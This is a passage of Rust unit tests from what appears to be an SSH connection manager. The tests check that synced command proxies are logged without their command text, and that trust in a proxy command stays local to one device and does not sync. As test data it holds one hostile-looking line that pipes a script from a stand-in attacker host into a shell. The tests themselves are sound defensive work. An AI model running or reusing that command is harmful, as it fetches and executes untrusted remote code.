    fn the_audit_line_never_carries_the_command() {
        const PAYLOAD: &str = "curl -s http://attacker.example/x.sh | sh";
        let vault = vault();
        let id = Uuid::new_v4();
        let now = Utc::now();
        seed_conn(&vault, id, "web-01", now - Duration::seconds(60));

        let mut c = Connection::new("web-01", "10.0.0.9");
        c.id = id;
        c.updated_at = now;
        c.proxy = Some(oryxis_core::models::connection::ProxyConfig {
            proxy_type: oryxis_core::models::connection::ProxyType::Command(PAYLOAD.into()),
            host: String::new(),
            port: 0,
            username: None,
            password: None,
        });
        let wrapper = protocol::SyncConnection {
            connection: c,
            password: None,
            password_cleared: false,
            proxy_password: None,
            proxy_password_cleared: false,
            totp_secret: None,
            totp_secret_cleared: false,
            target_password: None,
            target_password_cleared: false,
        };
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let payload = cipher
            .encrypt(&serde_json::to_vec(&wrapper).unwrap())
            .unwrap();
        apply_records(
            &vault,
            &[protocol::SyncRecord {
                entity_type: EntityType::Connection,
                entity_id: id,
                updated_at: now,
                is_deleted: false,
                payload,
            }],
            Some(&SECRET),
        )
        .unwrap();

        let logs = vault.lock().unwrap().list_logs(50).unwrap();
        assert_eq!(logs.len(), 1);
        assert!(
            logs[0].message.contains("command proxy"),
            "the line should say a command proxy is now in the route: {}",
            logs[0].message
        );
        assert!(
            !logs[0].message.contains(PAYLOAD),
            "the command line must never be logged"
        );
    }

    /// Approval is a LOCAL act and stays one: nothing a peer can push
    /// grants it, and the vault it was granted in is the only one that
    /// holds it.
    #[test]
    fn approving_a_command_proxy_is_local_and_per_line() {
        const CMD: &str = "cloudflared access ssh --hostname bastion.example";
        let other_device = vault();
        let vault = vault();

        vault
            .lock()
            .unwrap()
            .trust_proxy_command(CMD, "web-01:22")
            .unwrap();
        assert!(vault.lock().unwrap().is_proxy_command_trusted(CMD));
        // One edited character is a different process, so it is a
        // different decision.
        assert!(!vault
            .lock()
            .unwrap()
            .is_proxy_command_trusted(&format!("{CMD}x")));
        // And the grant does not travel: no EntityType covers the table,
        // so a full sync round cannot carry it.
        assert!(!other_device.lock().unwrap().is_proxy_command_trusted(CMD));

        vault
            .lock()
            .unwrap()
            .forget_proxy_command(
                &oryxis_core::models::connection::proxy_command_fingerprint(CMD),
            )
            .unwrap();
        assert!(!vault.lock().unwrap().is_proxy_command_trusted(CMD));
    }
}
